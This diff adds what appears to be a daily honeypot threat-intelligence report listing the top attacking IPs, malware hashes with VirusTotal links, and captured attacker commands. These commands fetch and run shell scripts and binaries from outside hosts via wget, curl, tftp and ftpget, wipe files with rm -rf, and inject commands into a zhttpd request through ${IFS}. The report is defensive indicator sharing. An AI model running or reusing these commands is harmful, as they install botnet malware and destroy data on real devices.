@@ -1,0 +1,29 @@
+Top 5 IPs for 2024-01-25:
+
+66.59.211.240
+146.190.43.91
+112.25.169.204
+120.194.141.242
+173.52.101.9
+
+Malware download: 
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+cb250dbc09120966d8163d7fc5f26349becb78c338f2fb7786885ae4f01151b6
+https://www.virustotal.com/gui/file/cb250dbc09120966d8163d7fc5f26349becb78c338f2fb7786885ae4f01151b6
+340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+https://www.virustotal.com/gui/file/340c8464c2007ce3f80682e15dfafa4180b641d53c14201b929906b7b0284d87
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; rm -rf *sh*;rm -rf *arm*; rm -rf *ppc*; rm -rf *x86*; rm -rf *mips*;rm -rf *mpsl*;rm -rf *spc*; rm -rf *m68k*; busybox wget http://103.245.236.146/w.sh; sh w.sh; wget http://103.245.236.146/w.sh; sh w.sh; curl http://103.245.236.146/w.sh; sh w.sh; busybox wget http://103.245.236.146/wget.sh; sh wget.sh; wget http://103.245.236.146/wget.sh; sh wget.sh; curl http://103.245.236.146/wget.sh; sh wget.sh; busybox wget http://103.245.236.146/c.sh; sh c.sh; wget http://103.245.236.146/c.sh; sh c.sh; curl http://103.245.236.146/c.sh; sh c.sh;
+
+cd /data/local/tmp/; busybox wget http://93.123.85.90/vlxx.arm7; chmod 777 vlxx.arm7; ./vlxx.arm7 hitler; rm -rf *
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.123.85.79/GuruITDDoS3.sh; curl -O http://93.123.85.79/GuruITDDoS3.sh; chmod 777 GuruITDDoS3.sh; sh GuruITDDoS3.sh; tftp 93.123.85.79 -c get GuruITDDoS1.sh; chmod 777 GuruITDDoS1.sh; sh GuruITDDoS1.sh; tftp -r GuruITDDoS2.sh -g 93.123.85.79; chmod 777 GuruITDDoS2.sh; sh GuruITDDoS2.sh; ftpget -v -u anonymous -p anonymous -P 21 93.123.85.79 GuruITDDoS4.sh GuruITDDoS4.sh; sh GuruITDDoS4.sh; rm -rf GuruITDDoS1.sh GuruITDDoS2.sh GuruITDDoS4.sh; rm -rf *
+
+GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.152/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
